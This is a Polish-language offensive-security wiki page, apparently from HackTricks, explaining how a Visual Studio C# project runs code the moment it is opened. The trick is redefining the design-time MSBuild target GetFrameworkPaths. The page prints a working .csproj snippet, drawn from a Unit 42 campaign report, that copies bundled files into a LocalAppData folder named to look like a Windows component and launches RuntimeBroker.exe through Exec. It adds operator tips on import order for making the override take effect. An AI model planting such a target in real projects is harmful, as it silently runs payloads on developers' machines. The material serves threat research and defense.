# Wykonywanie MSBuild w czasie projektowania projektu Visual Studio

{{#include ../banners/hacktricks-training.md}}

Otwarcie projektu C# w Visual Studio nie jest biernym odczytem. Kompilacja w czasie projektowania wywołuje nazwane cele MSBuild, aby zainicjować IntelliSense, referencje i debugowanie, **zanim** programista wybierze opcję Build lub Run. `GetFrameworkPaths` jest jednym z tych celów. Projekt, który redefiniuje ten cel, może sprawić, że samo załadowanie projektu uruchomi kod w kontekście użytkownika, bez konieczności osobnego kliknięcia payloadu.<sup>[[1]](#references)[[2]](#references)</sup>

Opisany projekt deklarował pliki zasobów, a następnie używał `MakeDir`, `Copy` i `Exec` w zastępującym celu, aby przygotować i uruchomić payload znajdujący się w tym samym katalogu. Ten skrócony fragment zachowuje ścieżkę wykonania pokazaną na rysunku 6 w źródle; powinien znaleźć się w pliku `.csproj`, a nie w samodzielnym pliku XML.<sup>[[1]](#references)</sup>

```xml
<ItemGroup>
  <ResourceFiles Include="Resources\**\*.*" />
</ItemGroup>
<Target Name="GetFrameworkPaths">
  <MakeDir Directories="$(LocalAppData)\Microsoft\RuntimeBrokers" />
  <Copy SourceFiles="@(ResourceFiles)"
        DestinationFolder="$(LocalAppData)\Microsoft\RuntimeBrokers\%(RecursiveDir)"
        SkipUnchangedFiles="true" />
  <Exec Command='start "" "$(LocalAppData)\Microsoft\RuntimeBrokers\RuntimeBroker.exe"' />
</Target>
```

**Kolejność importowania ma znaczenie:** MSBuild używa *ostatniej* definicji elementu target. Nie ma gwarancji, że target zapisany w pliku projektu zastąpi target Microsoft, jeśli późniejszy import zdefiniuje go ponownie. Projekty w stylu SDK używające `<Project Sdk="...">` niejawnie importują targety SDK po treści projektu, dlatego sprawdź kolejność importów po ewaluacji, zamiast zakładać, że to dokładne nadpisanie zadziała w każdym projekcie. `MSBuild.exe -preprocess:expanded.xml project.csproj` rozwija importy bez kompilowania projektu i może pomóc w zlokalizowaniu efektywnej definicji targetu.<sup>[[3]](#references)[[4]](#references)</sup>

To powierzchnia wykonawcza projektu deweloperskiego, a nie instalacja rozszerzenia VSIX ani samodzielny sposób na eskalację uprawnień. Jeśli przygotowany plik wykonywalny korzysta ze złośliwego, sąsiadującego pliku `.exe.config` lub DLL, przejdź do [AppDomainManager hijacking i DLL sideloading](windows-local-privilege-escalation/dll-hijacking/).

## References

- [1] [Unit 42 - Kampania Blinder Tunnel atakuje iracką infrastrukturę](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
- [2] [Microsoft Learn - Integracja z Visual Studio (MSBuild)](https://learn.microsoft.com/en-us/visualstudio/msbuild/visual-studio-integration-msbuild?view=visualstudio)
- [3] [Microsoft Learn - Targety MSBuild](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets)
- [4] [Microsoft Learn - Dokumentacja wiersza poleceń MSBuild](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-command-line-reference?view=visualstudio)
{{#include ../banners/hacktricks-training.md}}
